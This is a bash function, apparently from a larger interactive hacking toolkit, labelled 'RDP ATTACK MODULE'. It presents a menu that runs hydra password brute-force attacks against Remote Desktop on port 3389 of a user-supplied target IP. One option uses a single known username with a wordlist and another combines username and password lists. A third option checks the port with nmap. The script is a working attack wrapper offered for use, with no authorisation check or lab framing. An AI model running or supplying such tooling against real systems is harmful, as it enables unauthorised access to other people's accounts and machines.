# ===================================================================
rdp_attack() {
    echo -e "\n${YELLOW}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║${NC} ${BOLD}${RED}RDP ATTACK MODULE${NC} ${YELLOW}║${NC}"
    echo -e "${YELLOW}╚════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}[1]${NC} Known Username + Wordlist (e.g., Tayyab)"
    echo -e "${CYAN}[2]${NC} Full Brute Force (User + Pass lists)"
    echo -e "${CYAN}[3]${NC} Check RDP Port"
    echo -e "${CYAN}[4]${NC} Back"
    read -p "Select [1-4]: " rdp_choice
    case $rdp_choice in
        1)
            get_target_ip || return
            read -p "Enter Username (e.g., Tayyab): " USERNAME
            get_wordlist
            echo -e "${GREEN}[+] Running: hydra -l $USERNAME -P $WORDLIST -s 3389 -t 4 rdp://$TARGET_IP -V${NC}"
            hydra -l $USERNAME -P $WORDLIST -s 3389 -t 4 rdp://$TARGET_IP -V
            ;;
        2)
            get_target_ip || return
            read -p "Enter Username List: " USERLIST
            get_wordlist
            hydra -L $USERLIST -P $WORDLIST -s 3389 -t 4 rdp://$TARGET_IP -V
            ;;
        3)
            get_target_ip || return
            nmap -p 3389 $TARGET_IP
            ;;
        4) return ;;
    esac
    read -p "Press [Enter] to continue..."
}

